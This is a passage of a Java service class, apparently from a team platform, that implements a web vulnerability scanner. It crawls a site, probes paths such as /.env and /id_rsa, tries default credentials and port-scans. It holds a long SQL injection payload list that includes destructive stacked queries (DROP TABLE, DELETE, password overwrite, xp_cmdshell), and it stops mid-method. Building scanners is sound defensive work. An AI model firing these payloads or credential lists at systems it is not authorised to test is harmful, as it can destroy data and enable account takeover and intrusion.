package com.ruoyi.team.service.impl;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.HttpURLConnection;
import java.net.URI;
import java.net.Socket;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.time.Duration;
import java.time.LocalDateTime;
import java.util.ArrayDeque;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.HashMap;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Queue;
import java.util.Set;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.TimeUnit;
import java.util.function.Consumer;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Stream;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

import com.ruoyi.team.domain.CredentialState;
import com.ruoyi.team.domain.TeamModelConfig;
import com.ruoyi.team.domain.VulnFinding;
import com.ruoyi.team.domain.VulnScanJob;
import com.ruoyi.team.mapper.VulnFindingMapper;
import com.ruoyi.team.mapper.VulnScanJobMapper;
import com.ruoyi.team.service.ITeamModelConfigService;
import com.ruoyi.team.service.IVulnScanService;

@Service
public class VulnScanServiceImpl implements IVulnScanService {
    private static final Logger log = LoggerFactory.getLogger(VulnScanServiceImpl.class);

    private static final int DEFAULT_MAX_PAGES = 24;
    private static final int DEFAULT_MAX_DEPTH = 2;
    private static final int MAX_PORT_SCAN_COUNT = 80;
    private static final int PORT_CONNECT_TIMEOUT_MS = 650;
    private static final int MAX_BODY_CHARS = 1024 * 1024;
    private static final Pattern IPV4 = Pattern.compile("^(?:\\d{1,3}\\.){3}\\d{1,3}$");

    private static final Pattern FORM_TAG = Pattern.compile("<form\\b[^>]*>", Pattern.CASE_INSENSITIVE);
    private static final Pattern INPUT_TAG = Pattern.compile("<input[^>]*>", Pattern.CASE_INSENSITIVE);
    private static final Pattern SCRIPT_TAG = Pattern.compile("<script[^>]*>", Pattern.CASE_INSENSITIVE);
    private static final Pattern INLINE_EVENT = Pattern.compile("on(?:error|load|click|submit|focus|blur|change|mouseover|keyup|keydown)\\s*=", Pattern.CASE_INSENSITIVE);
    private static final Pattern HREF_JS = Pattern.compile("href\\s*=\\s*[\"']\\s*javascript:", Pattern.CASE_INSENSITIVE);
    private static final Pattern LINK = Pattern.compile("(?:href|src)\\s*=\\s*[\"']([^\"'#\\s]+)[\"']", Pattern.CASE_INSENSITIVE);
    private static final Pattern ACTION = Pattern.compile("action\\s*=\\s*[\"']([^\"']*)[\"']", Pattern.CASE_INSENSITIVE);
    private static final Pattern METHOD = Pattern.compile("method\\s*=\\s*[\"']?([a-z]+)[\"']?", Pattern.CASE_INSENSITIVE);
    private static final Pattern REDIRECT_PARAM = Pattern.compile("[?&](?:redirect|url|next|return|returnUrl|goto|target|redir|forward|callback|dest|destination)\\s*=", Pattern.CASE_INSENSITIVE);
    private static final Pattern MIXED_CONTENT = Pattern.compile("(?:src|href)\\s*=\\s*[\"']http://[^\"']+[\"']", Pattern.CASE_INSENSITIVE);
    private static final Pattern COMMENT_LEAK = Pattern.compile("<!--[\\s\\S]{0,500}?(?:todo|fixme|password|secret|token|api[_-]?key|debug)[\\s\\S]{0,500}?-->", Pattern.CASE_INSENSITIVE);

    private static final List<String> BASE_SENSITIVE_PATHS = Arrays.asList(
        "/.env", "/.git/config", "/config.php.bak", "/backup.zip", "/backup.tar.gz",
        "/db.sql", "/dump.sql", "/debug", "/actuator/env", "/actuator/heapdump",
        "/swagger-ui/index.html", "/v3/api-docs", "/api-docs", "/server-status", "/phpinfo.php",
        "/login", "/admin/login", "/api/login", "/signin"
    );

    private static final List<String> CRAWL_SEED_PATHS = Arrays.asList(
        "/login", "/admin/login", "/api/login", "/signin", "/auth/login",
        "/user/login", "/account/login", "/auth", "/admin", "/api", "/register"
    );

    private static final List<String> API_SUB_PATHS = Arrays.asList(
        "v1/auth/login", "v1/login", "v2/auth/login", "v2/login",
        "v1/auth/token", "v1/token", "auth/login", "auth/token",
        "token", "oauth/token", "v1/auth/signin", "v1/users/login",
        "v1/user/login", "v2/user/login", "v1/auth", "v2/auth"
    );

    private static final List<String> SOURCE_LEAK_PATHS = Arrays.asList(
        "/.git/HEAD", "/.svn/entries", "/.DS_Store", "/.env.backup", "/.env.local",
        "/.env.production", "/.env.development", "/config.yml", "/config.yaml",
        "/web.config", "/.htaccess", "/nginx.conf", "/docker-compose.yml", "/Dockerfile",
        "/wp-config.php", "/wp-config.php.bak", "/wp-config.php~", "/wp-config.php.old",
        "/settings.py", "/settings.py.bak", "/application.properties", "/application.yml",
        "/appsettings.json", "/app.config", "/composer.json", "/composer.lock",
        "/package.json", "/Gemfile", "/Gemfile.lock", "/Cargo.toml", "/go.mod",
        "/.npmrc", "/.yarnrc", "/credentials", "/.credentials", "/id_rsa", "/id_ed25519"
    );

    private static final String[] BACKUP_SUFFIXES = {
        ".bak", ".old", ".backup", ".swp", "~", ".save", ".orig", ".tmp", ".disabled", ".1", ".2"
    };

    private static final String[][] DEFAULT_CREDENTIALS = {
        {"admin", "admin"}, {"admin", "admin123"}, {"admin", "123456"}, {"admin", "password"},
        {"root", "root"}, {"root", "admin"}, {"root", "123456"},
        {"user", "user"}, {"user", "123456"}, {"test", "test"},
        {"sa", "sa"}, {"sa", ""}, {"system", "manager"}, {"system", "system"},
        {"administrator", "administrator"}, {"guest", "guest"},
        {"tomcat", "tomcat"}, {"jboss", "jboss"}, {"weblogic", "weblogic"}
    };

    private static final List<JsonLoginBody> JSON_LOGIN_BODIES = Arrays.asList(
        new JsonLoginBody("{\"username\":\"admin\",\"password\":\"admin\"}", "username", "password"),
        new JsonLoginBody("{\"email\":\"admin@test.com\",\"password\":\"admin\"}", "email", "password"),
        new JsonLoginBody("{\"user\":\"admin\",\"pass\":\"admin\"}", "user", "pass"),
        new JsonLoginBody("{\"name\":\"admin\",\"pwd\":\"admin\"}", "name", "pwd"),
        new JsonLoginBody("{\"account\":\"admin\",\"password\":\"admin\"}", "account", "password")
    );

    private static final List<Rule> CODE_RULES = Arrays.asList(
        new Rule("硬编码密钥", "CRITICAL", "发现疑似硬编码密钥或凭证", "立即迁移到环境变量或密钥管理服务，并轮换已泄露密钥",
            "(?i)(?:api[_-]?key|secret[_-]?key|access[_-]?key)\\s*[:=]\\s*[\"'][A-Za-z0-9_\\-]{20,}[\"']",
            "(?i)(?:password|passwd|pwd)\\s*[:=]\\s*[\"'][^\"']{4,}[\"']",
            "(?i)(?:token|jwt)\\s*[:=]\\s*[\"'][A-Za-z0-9_\\-.]{20,}[\"']",
            "(?i)sk-[A-Za-z0-9]{20,}",
            "(?i)ghp_[A-Za-z0-9]{30,}"),
        new Rule("SQL注入", "CRITICAL", null, "使用参数化查询或 ORM 参数绑定，避免字符串拼接 SQL",
            "(?i)\"(?:SELECT|INSERT|UPDATE|DELETE|DROP)\\s.*\\+\\s*",
            "(?i)(?:execute|executeQuery|executeUpdate)\\s*\\(\\s*\\w+\\s*\\+",
            "(?i)format\\s*\\(\\s*\"\\s*(?:SELECT|INSERT|UPDATE|DELETE)",
            "(?i)f[\"']\\s*(?:SELECT|INSERT|UPDATE|DELETE)"),
        new Rule("XSS", "HIGH", null, "对用户输入进行 HTML 转义，使用 textContent 替代 innerHTML",
            "(?i)innerHTML\\s*=", "(?i)dangerouslySetInnerHTML", "(?i)v-html\\s*=", "(?i)document\\.write\\s*\\("),
        new Rule("路径遍历", "HIGH", null, "规范化用户输入路径并使用白名单限制可访问目录",
            "(?i)new\\s+File(?:InputStream|Reader|Writer|OutputStream)?\\s*\\(.*\\+",
            "(?i)Files\\.(?:read|write|copy|move|newInputStream|newOutputStream)\\s*\\(.*\\+",
            "(?i)Paths\\.get\\s*\\(.*\\+"),
        new Rule("命令注入", "CRITICAL", null, "使用参数数组执行命令，并对白名单参数做严格校验",
            "(?i)Runtime\\.getRuntime\\(\\)\\.exec\\s*\\(.*\\+",
            "(?i)ProcessBuilder\\s*\\([^)]*\\+",
            "(?i)os\\.system\\s*\\(.*\\+",
            "(?i)subprocess\\.(?:call|Popen|run|check_output)\\s*\\(.*\\+"),
        new Rule("不安全加密", "MEDIUM", null, "使用 SHA-256、bcrypt/argon2、AES-GCM 等安全算法",
            "(?i)MessageDigest\\.getInstance\\s*\\(\\s*\"MD5\"",
            "(?i)MessageDigest\\.getInstance\\s*\\(\\s*\"SHA-1\"",
            "(?i)hashlib\\.md5\\s*\\(",
            "(?i)Cipher\\.getInstance\\s*\\(\\s*\"DES\"",
            "(?i)\"AES/ECB"),
        new Rule("XXE", "CRITICAL", null, "禁用 XML 外部实体解析，使用安全的 XML 处理器",
            "(?i)DocumentBuilderFactory\\.newInstance\\(\\)",
            "(?i)SAXParserFactory\\.newInstance\\(\\)",
            "(?i)XMLInputFactory\\.newFactory\\(\\)",
            "(?i)etree\\.(?:parse|fromstring|iterparse)\\(",
            "(?i)xml\\.dom\\.minidom\\.parse\\("),
        new Rule("反序列化漏洞", "CRITICAL", null, "避免反序列化不可信数据，使用白名单类型的序列化方案",
            "(?i)ObjectInputStream",
            "(?i)readObject\\s*\\(\\s*\\)",
            "(?i)readResolve\\s*\\(\\s*\\)",
            "(?i)pickle\\.(?:loads?|Unpickler)\\(",
            "(?i)yaml\\.load\\s*\\(.*(?!.*yaml\\.SafeLoader)",
            "(?i)unserialize\\s*\\(.*\\$",
            "(?i)Marshal\\.Load\\("),
        new Rule("JWT安全缺陷", "HIGH", null, "验证 JWT 签名算法，禁用 none 算法，使用强密钥",
            "(?i)JWT\\.(?:decode|verify)\\s*\\(.*\"none\"",
            "(?i)jwt\\.decode\\s*\\(.*algorithms\\s*=\\s*\\[?\\s*\"none\"",
            "(?i)verify_signature\\s*=\\s*false",
            "(?i)verify_signature\\s*=\\s*False",
            "(?i)verify\\s*=\\s*false",
            "(?i)options\\s*=\\s*\\{\\s*\"verify_signature\":\\s*false",
            "(?i)jose\\.jwt\\.(?:decode|verify)\\s*\\(.*verify\\s*=\\s*false"),
        new Rule("原型链污染", "HIGH", null, "避免操作 __proto__ 或 constructor.prototype，使用 Object.create(null)/Map",
            "(?i)__proto__\\s*\\[",
            "(?i)__proto__\\s*\\.\\s*\\w+\\s*=",
            "(?i)constructor\\s*\\.\\s*prototype\\s*\\.\\s*\\w+\\s*=",
            "(?i)Object\\.assign\\s*\\(\\s*\\{\\}\\s*,\\s*req\\.(?:body|query|params)",
            "(?i)\\.merge\\s*\\(\\s*(?:req\\.(?:body|query|params)|user)",
            "(?i)lodash\\.merge\\s*\\(.*req\\.(?:body|query|params)"),
        new Rule("LDAP注入", "HIGH", null, "对 LDAP 查询参数进行转义，使用参数化查询 API",
            "(?i)ldap(?:search|query|filter)\\s*\\(.*\\+",
            "(?i)\\(&\\s*\\(\\w+\\s*=\\s*\\*\\s*\\)",
            "(?i)LDAPQuery\\s*\\(.*\\+",
            "(?i)ldap_search\\s*\\(.*\\$"),
        new Rule("XPath注入", "MEDIUM", null, "使用参数化 XPath 查询，避免字符串拼接",
            "(?i)xpath\\.compile\\s*\\(.*\\+",
            "(?i)XPath\\.evaluate\\s*\\(.*\\+",
            "(?i)xpath\\.select(?:Nodes|SingleNode)\\s*\\(.*\\+")
    );

    @Autowired
    private VulnScanJobMapper jobMapper;

    @Autowired
    private VulnFindingMapper findingMapper;

    @Autowired
    private ITeamModelConfigService modelConfigService;

    static class ScanProgress {
        final List<String> lines = new ArrayList<>();
        Consumer<String> sseSink;

        void emit(String msg) {
            lines.add(msg);
            if (sseSink != null) {
                sseSink.accept(msg);
            }
        }

        String join() {
            return String.join("\n", lines);
        }
    }

    @Override
    @Transactional
    public VulnScanJob scanUrl(String targetUrl, Long userId, Long deptId, String modelType, Long modelId,
                               Map<String, String> requestHeaders, String scanProfile, String customPaths,
                               Integer maxDepth, Integer maxPages, Boolean portScanEnabled, String portSpec) {
        VulnScanJob job = createJob("url", targetUrl, userId, deptId, modelType, modelId);
        job.setProgressStep("running");
        job.setProgressText("开始网址漏洞扫描");
        jobMapper.insertVulnScanJob(job);

        ScanProgress progress = new ScanProgress();
        UrlScanOptions options = UrlScanOptions.of(requestHeaders, scanProfile, customPaths, maxDepth, maxPages, portScanEnabled, portSpec);
        VulnLlmVerifier llm = buildVerifier(deptId, userId, modelType, modelId);
        List<VulnFinding> findings = doUrlScan(targetUrl, options, progress, llm);
        if ("department".equalsIgnoreCase(modelType)) {
            if (llm == null) {
                throw new IllegalStateException("部门模型配置有问题：未找到可用部门模型");
            }
            progress.emit("12. AI 复核与建议：调用部门模型复核候选漏洞、降低误报并补充修复建议");
            findings = verifyUrlFindings(findings, llm, targetUrl, progress);
        } else {
            progress.emit("12. AI 复核与建议：选择资源与配置的模型配置，服务端完成规则扫描，客户端继续调用本地模型复核");
        }
        dedupeFindings(findings);
        job.setProgressText(progress.join());
        saveFindings(job.getId(), findings);
        updateJobCounts(job, findings);
        job.setFindings(findings);
        return job;
    }

    @Override
    public VulnScanJob scanUrlStream(String targetUrl, Long userId, Long deptId, String modelType, Long modelId,
                                     Map<String, String> requestHeaders, String scanProfile, String customPaths,
                                     Integer maxDepth, Integer maxPages, Boolean portScanEnabled, String portSpec,
                                     Consumer<String> progressCallback) {
        VulnScanJob job = createJob("url", targetUrl, userId, deptId, modelType, modelId);
        job.setProgressStep("running");
        job.setProgressText("开始网址漏洞扫描");
        jobMapper.insertVulnScanJob(job);

        ScanProgress progress = new ScanProgress();
        progress.sseSink = progressCallback;
        progressCallback.accept("开始网址漏洞扫描");

        UrlScanOptions options = UrlScanOptions.of(requestHeaders, scanProfile, customPaths, maxDepth, maxPages, portScanEnabled, portSpec);
        VulnLlmVerifier llm = buildVerifier(deptId, userId, modelType, modelId);
        List<VulnFinding> findings = doUrlScan(targetUrl, options, progress, llm);
        if ("department".equalsIgnoreCase(modelType)) {
            if (llm == null) {
                throw new IllegalStateException("部门模型配置有问题：未找到可用部门模型");
            }
            progress.emit("12. AI 复核与建议：调用部门模型复核候选漏洞、降低误报并补充修复建议");
            findings = verifyUrlFindings(findings, llm, targetUrl, progress);
        } else {
            progress.emit("12. AI 复核与建议：选择资源与配置的模型配置，服务端完成规则扫描，客户端继续调用本地模型复核");
        }
        dedupeFindings(findings);
        job.setProgressText(progress.join());
        saveFindings(job.getId(), findings);
        updateJobCounts(job, findings);
        job.setFindings(findings);
        return job;
    }

    @Override
    @Transactional
    public VulnScanJob scanCode(String dirPath, Long userId, Long deptId, String modelType, Long modelId) {
        VulnScanJob job = createJob("code", dirPath, userId, deptId, modelType, modelId);
        job.setProgressStep("running");
        job.setProgressText("开始代码漏洞扫描");
        jobMapper.insertVulnScanJob(job);

        VulnLlmVerifier llm = buildVerifier(deptId, userId, modelType, modelId);
        if ("department".equalsIgnoreCase(modelType) && llm == null) {
            throw new IllegalStateException("部门模型配置有问题：未找到可用部门模型");
        }
        ScanProgress progress = new ScanProgress();
        List<VulnFinding> findings = doCodeScan(dirPath, llm, progress);
        job.setProgressText(progress.join());
        saveFindings(job.getId(), findings);
        updateJobCounts(job, findings);
        job.setFindings(findings);
        return job;
    }

    @Override
    public VulnScanJob getJobWithFindings(Long jobId) {
        VulnScanJob job = jobMapper.selectVulnScanJobById(jobId);
        if (job != null) {
            job.setFindings(findingMapper.selectFindingsByJobId(jobId));
        }
        return job;
    }

    @Override
    public List<VulnScanJob> getHistory(Long userId) {
        VulnScanJob query = new VulnScanJob();
        query.setUserId(userId);
        query.setStatus("completed");
        return jobMapper.selectVulnScanJobList(query);
    }

    private VulnLlmVerifier buildVerifier(Long deptId, Long userId, String modelType, Long modelId) {
        if ("personal".equalsIgnoreCase(modelType)) {
            return null;
        }
        try {
            if (modelId != null && modelId > 0) {
                TeamModelConfig selected = modelConfigService.selectTeamModelConfigById(modelId);
                if (selected != null && selected.getIsActive() != null && selected.getIsActive() == 1) {
                    VulnLlmVerifier verifier = new VulnLlmVerifier(selected);
                    verifier.testConnection();
                    return verifier;
                }
                throw new IllegalStateException("部门模型配置有问题：选择的模型不存在或未启用");
            }
            List<TeamModelConfig> configs = modelConfigService.selectActiveModelConfigsByDeptId(deptId);
            if (configs.isEmpty()) {
                configs = modelConfigService.selectAvailableModelConfigs(deptId, userId, null);
            }
            if (configs.isEmpty()) {
                return null;
            }
            VulnLlmVerifier verifier = new VulnLlmVerifier(configs.get(0));
            verifier.testConnection();
            return verifier;
        } catch (Exception e) {
            log.warn("Department LLM config validation failed: {}", e.getMessage());
            throw new IllegalStateException(normalizeDepartmentModelError(e));
        }
    }

    private String normalizeDepartmentModelError(Exception e) {
        String message = e.getMessage() == null ? "" : e.getMessage();
        String lower = message.toLowerCase(Locale.ROOT);
        if (lower.contains("401")
            || lower.contains("unauthorized")
            || lower.contains("authentication")
            || lower.contains("invalid api key")
            || lower.contains("api key") && lower.contains("invalid")) {
            return "部门模型配置有问题，apiKey配置错误";
        }
        if (lower.contains("403") || lower.contains("forbidden")) {
            return "部门模型配置有问题，apiKey无权限或模型无访问权限";
        }
        if (lower.contains("404") || lower.contains("model")) {
            return "部门模型配置有问题，模型名称或接口地址错误";
        }
        if (lower.contains("timeout") || lower.contains("timed out")) {
            return "部门模型配置有问题，模型接口连接超时";
        }
        return "部门模型配置有问题，请检查部门模型的接口地址、模型名称和apiKey";
    }

    private VulnScanJob createJob(String type, String target, Long userId, Long deptId, String modelType, Long modelId) {
        VulnScanJob job = new VulnScanJob();
        job.setScanType(type);
        job.setTarget(target);
        job.setStatus("running");
        job.setUserId(userId);
        job.setDeptId(deptId);
        job.setModelType(modelType);
        job.setModelId(modelId);
        job.setCreatedAt(LocalDateTime.now());
        return job;
    }

    private void saveFindings(Long jobId, List<VulnFinding> findings) {
        if (findings.isEmpty()) return;
        for (VulnFinding finding : findings) {
            finding.setJobId(jobId);
        }
        findingMapper.batchInsertVulnFindings(findings);
    }

    private void updateJobCounts(VulnScanJob job, List<VulnFinding> findings) {
        job.setTotalFindings(findings.size());
        job.setCriticalCount((int) findings.stream().filter(f -> "CRITICAL".equals(f.getSeverity())).count());
        job.setHighCount((int) findings.stream().filter(f -> "HIGH".equals(f.getSeverity())).count());
        job.setMediumCount((int) findings.stream().filter(f -> "MEDIUM".equals(f.getSeverity())).count());
        job.setLowCount((int) findings.stream().filter(f -> "LOW".equals(f.getSeverity())).count());
        job.setStatus("completed");
        job.setProgressStep("completed");
        String summary = "13. 保存结果：扫描完成，共确认 " + findings.size() + " 个漏洞";
        job.setProgressText((job.getProgressText() == null || job.getProgressText().isBlank())
            ? summary
            : job.getProgressText() + "\n" + summary);
        jobMapper.updateVulnScanJob(job);
    }

    private List<VulnFinding> doUrlScan(String targetUrl, UrlScanOptions options, ScanProgress progress, VulnLlmVerifier llm) {
        List<VulnFinding> findings = new ArrayList<>();
        try {
            progress.emit("1. 校验目标：规范化 URL，限制在同源范围内扫描");
            URI baseUri = normalizeTargetUri(targetUrl);
            progress.emit(options.headers.isEmpty()
                ? "2. 加载登录态：未提供 Cookie/Authorization，仅扫描公开页面"
                : "2. 加载登录态：已携带 Cookie/Authorization/自定义 Header 扫描登录后页面");
            progress.emit("3. 扫描策略：" + options.profileLabel() + "，最大深度 " + options.maxDepth + "，最多页面 " + options.maxPages);
            runPortScanIfNeeded(baseUri, options, findings, progress);
            checkTlsSecurity(baseUri, findings, progress);
            crawlSameOrigin(baseUri, options, findings, progress);
            progress.emit("4. SQL 注入检测：已完成 URL 参数、表单输入点的注入测试（含布尔盲注、时间盲注、联合查询、堆叠查询等）");
            progress.emit("5. XSS/CSRF/SSTI 检测：已完成反射型 XSS、CSRF 表单、SSTI 模板注入（Jinja2/Freemarker/Velocity）检测");
            progress.emit("6. SSRF/NoSQL/LFI 检测：已完成服务端请求伪造、NoSQL 注入（MongoDB/Redis）、文件包含与目录穿越检测");
            progress.emit("7. 安全头/CORS/目录列举：已完成 HTTP 安全头、跨域配置、敏感目录暴露检查");
            checkSensitivePaths(baseUri, options, findings, progress);
            progress.emit("8. 敏感路径/TLS/端口：已完成敏感路径探测、TLS 证书校验、端口扫描与服务识别");
            runSystemChecks(baseUri, options, findings, progress);
            progress.emit("9. 系统漏洞检测：已完成 HTTP 方法探测、CRLF/Host 头注入、默认凭据爆破、源码泄露扫描");
            progress.emit("10. 误报控制：401/403 或业务 code=401 视为认证保护生效，不计入漏洞");
            if (llm != null) {
                progress.emit("11. AI 智能发现：调用大模型分析原始响应，发现规则扫描遗漏的漏洞");
                runLlmDiscovery(baseUri, options, llm, findings, progress);
            }
        } catch (Exception e) {
            findings.add(new VulnFinding(null, "MEDIUM", "连接错误", targetUrl,
                "无法连接到目标 URL: " + e.getMessage(), "确认 URL 是否正确、网络是否可达、是否需要登录态"));
            progress.emit("扫描失败：无法访问目标 URL，原因：" + e.getMessage());
        }
        return findings;
    }

    private void crawlSameOrigin(URI baseUri, UrlScanOptions options, List<VulnFinding> findings, ScanProgress progress) {
        Queue<CrawlTarget> queue = new ArrayDeque<>();
        Set<String> visited = new LinkedHashSet<>();
        queue.add(new CrawlTarget(baseUri, 0));
        for (String seedPath : CRAWL_SEED_PATHS) {
            URI seedUri = baseUri.resolve(seedPath);
            if (isSameOrigin(baseUri, seedUri)) {
                queue.add(new CrawlTarget(seedUri, 0));
            }
        }
        for (String subPath : API_SUB_PATHS) {
            URI apiUri = baseUri.resolve(subPath);
            if (isSameOrigin(baseUri, apiUri)) {
                queue.add(new CrawlTarget(apiUri, 0));
            }
        }
        boolean checkedGlobalHeaders = false;
        while (!queue.isEmpty() && visited.size() < options.maxPages) {
            CrawlTarget current = queue.poll();
            URI uri = stripFragment(current.uri.normalize());
            if (!isSameOrigin(baseUri, uri) || !visited.add(uri.toString())) continue;
            PageFetch page = fetchPage(uri, options);
            progress.emit("爬取页面：" + uri + " -> HTTP " + page.status);
            if (page.error != null) {
                findings.add(new VulnFinding(null, "LOW", "页面访问失败", uri.toString(),
                    "爬取失败: " + page.error, "确认该路径是否需要登录、是否存在访问限制或服务异常"));
                continue;
            }
            if (!checkedGlobalHeaders) {
                checkSecurityHeaders(page.headers, uri.toString(), findings);
                checkCorsHeaders(page.headers, uri.toString(), findings);
                checkedGlobalHeaders = true;
            }
            checkCookieSecurity(page.headers, uri.toString(), findings);
            if (page.status >= 300 && page.status < 400) {
                String location = firstHeader(page.headers, "Location");
                if (location != null) checkOpenRedirect(uri.toString(), location, findings);
            }
            if (!isHtml(page.contentType)) {
                if (isApiContent(page.contentType) || isApiPath(uri.getPath())) {
                    scanApiPostEndpoint(uri, page, options, findings, progress);
                }
                continue;
            }
            runSqlInjectionChecks(uri, page, options, findings, progress);
            runXssProbeChecks(uri, page, options, findings, progress);
            runSsrfChecks(uri, page, options, findings, progress);
            runNoSqlInjectionChecks(uri, page, options, findings, progress);
            runSstiChecks(uri, page, options, findings, progress);
            runLfiChecks(uri, page, options, findings, progress);
            checkDirectoryListing(page, uri.toString(), findings, progress);
            scanHtmlContent(page.body, uri.toString(), findings);
            scanForms(page.body, uri, findings, progress);
            scanPassiveHtmlSignals(page.body, uri.toString(), findings);
            if (current.depth >= options.maxDepth) continue;
            for (URI link : extractLinks(page.body, uri)) {
                URI clean = stripFragment(link.normalize());
                if (isSameOrigin(baseUri, clean) && !visited.contains(clean.toString())) {
                    queue.add(new CrawlTarget(clean, current.depth + 1));
                }
            }
        }
    }

    // ── Comprehensive SQL injection payloads ──
    private static final String[] SQLI_ERROR_PAYLOADS = {
        // --- Basic quote / escape ---
        "'", "\"", "')", "\")", "');", "\");",
        "'))", "\"))",
        // --- Union select ---
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
        "' UNION ALL SELECT NULL--",
        "') UNION SELECT NULL--",
        "') UNION SELECT NULL,NULL--",
        "') UNION SELECT NULL,NULL,NULL--",
        // --- Boolean blind ---
        "' AND '1'='1",
        "' AND '1'='2",
        "' OR '1'='1",
        "' OR 1=1--",
        "' AND 1=1--",
        "' AND 1=2--",
        "' OR 'x'='x",
        "' AND 'x'='y",
        // --- Time blind ---
        "' AND SLEEP(5)--",
        "' OR SLEEP(5)--",
        "'; SELECT SLEEP(5)--",
        "' WAITFOR DELAY '0:0:5'--",
        "'; WAITFOR DELAY '0:0:5'--",
        "' AND pg_sleep(5)--",
        "'; SELECT pg_sleep(5)--",
        "' AND BENCHMARK(5000000,MD5(1))--",
        // --- Error-based ---
        "' AND extractvalue(1,concat(0x7e,database()))--",
        "' AND updatexml(1,concat(0x7e,database()),1)--",
        "' AND 1=convert(int,db_name())--",
        "' AND 1=ctxsys.drithsx.sn(1,(select banner from v$version))--",
        // --- Stacked queries ---
        "'; DROP TABLE users--",
        "'; DELETE FROM users--",
        "'; INSERT INTO users VALUES(1,'hacked')--",
        "'; UPDATE users SET password='hacked'--",
        "'; EXEC xp_cmdshell('dir')--",
        "'; SELECT @@version--",
        // --- Comment variations / WAF bypass ---
        "'--", "' #", "'/*", "'/**/", "'; --",
        "\"--", "\" #", "\"-- -",
        "1'--", "1' #", "1';--",
        "' || '1", "'+UNION+SELECT+NULL--",
        // --- Numeric / integer injection ---
        "-1 UNION SELECT NULL--",
        "0 UNION SELECT NULL--",
        "1 UNION SELECT NULL--",
        "1 OR 1=1",
        "1 AND 1=1",
        "1' AND '1'='1",
        "1' OR '1'='1",
        // --- ORDER BY / column enumeration ---
        "' ORDER BY 1--",
        "' ORDER BY 100--",
        "') ORDER BY 1--",
        // --- DBMS-specific ---
        "' OR '1'='1'--",   // MySQL single-line comment
        "' OR '1'='1'#",    // MySQL hash comment
        "' LIMIT 1--",      // MySQL limit
        "' AND 1=1/*",      // open comment
        "1' AND '1'='1' LIMIT 1--",
        // --- Null byte / encoding bypass ---
        "'%00",
        "\\'",
        // --- Information schema / metadata ---
        "' UNION SELECT table_name FROM information_schema.tables--",
        "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--",
    };

    // ── Comprehensive SQL error fingerprint database ──
    private static final String[] SQL_ERROR_PATTERNS = {
        // MySQL / MariaDB
        "SQL syntax",
        "mysql_fetch",
        "mysql_",
        "MariaDB",
        "You have an error in your SQL syntax",
        "check the manual that corresponds to your MySQL server version",
        "Warning: mysql",
        "MySQLSyntaxErrorException",
        "MySQLIntegrityConstraintViolationException",
        "mysqli_",
        "MySqlException",
        // PostgreSQL
        "PostgreSQL",
        "psql",
        "pg_query",
        "pg_exec",
        "pg_send_query",
        "org.postgresql",
        "PSQLException",
        "pg_",
        // SQL Server / MSSQL
        "Microsoft SQL Server",
        "SQL Server",
        "SqlException",
        "ODBC SQL Server Driver",
        "SQLServer",
        "mssql_",
        "mssql_query",
        "Unclosed quotation mark after",
        "Incorrect syntax near",
        // Oracle
        "Oracle",
        "ora-",
        "ORA-",
        "OracleException",
        "Oracle error",
        "PLS-",
        "ORA-01756",
        "ORA-00933",
        "ORA-00936",
        "ORA-01722",
        "ORA-06512",
        // SQLite
        "SQLite",
        "sqlite_",
        "SQLiteException",
        "SQLITE_",
        // DB2
        "DB2 SQL Error",
        "SQLCODE",
        "SQLSTATE",
        // General
        "JDBC",
        "jdbc",
        "DriverManager",
        "ResultSet",
        "PreparedStatement",
        "Statement\\.execute",
        "odbc_",
        "odbc_exec",
        "odbc_fetch",
        "database error",
        "database_error",
        "unclosed quotation mark",
        "quoted string not properly terminated",
        "supplied argument is not a valid MySQL",
        "column \\w+ not found",
        "table \\w+ doesn't exist",
        "unknown column",
        "invalid input syntax",
        "division by zero",
        "syntax error at or near",
        "unexpected end of command",
        // Generic SQL injection patterns in response
        "sql error",
        "sql_error",
        "SQLSTATE[",
        "Call to a member function",
        "DB::",
        "\\bPDO\\b",
        "\\bPDOException\\b",
    };

    private void runSqlInjectionChecks(URI pageUri, PageFetch baseline, UrlScanOptions options,
                                       List<VulnFinding> findings, ScanProgress progress) {
        // 1) URL query parameter injection
        Map<String, String> urlParams = queryParams(pageUri);
        if (!urlParams.isEmpty()) {
            progress.emit("SQL 注入：页面 " + pageUri + " URL 含有 " + urlParams.size() + " 个查询参数，开始注入测试");
            int tested = 0;
            int stopped = 0;
            for (String name : urlParams.keySet()) {
                if (stopped >= 3) {
                    progress.emit("SQL 注入：URL 参数已在 " + stopped + " 个参数上确认漏洞，停止进一步测试");
                    break;
                }
                SqlInjectionResult r = testSqlInjection(pageUri, name, null, options);
                tested += r.tested;
                if (r.hit) {
                    findings.add(new VulnFinding(null, "CRITICAL", "SQL注入", pageUri.toString(),
                        "URL 参数 " + name + " 对 Payload [" + r.payload + "] 返回 SQL 错误指纹",
                        "使用参数化查询或 ORM 参数绑定，关闭详细 SQL 错误回显"));
                    stopped++;
                }
            }
            progress.emit("SQL 注入：URL 参数共测试 " + tested + " 次（" + urlParams.size() + " 参数 × payloads）");
        } else {
            progress.emit("SQL 注入：页面 " + pageUri + " 未发现 URL 查询参数");
        }

        // 2) Form parameter injection
        List<FormParam> formParams = extractFormParams(baseline.body, pageUri);
        if (!formParams.isEmpty()) {
            progress.emit("SQL 注入：页面 " + pageUri + " 表单含有 " + formParams.size() + " 个输入参数，开始注入测试");
            int tested = 0;
            int stopped = 0;
            for (FormParam fp : formParams) {
                if (stopped >= 3) {
                    progress.emit("SQL 注入：表单参数已在 " + stopped + " 个参数上确认漏洞，停止进一步测试");
                    break;
                }
                SqlInjectionResult r = testFormParamSqlInjection(pageUri, fp, options);
                tested += r.tested;
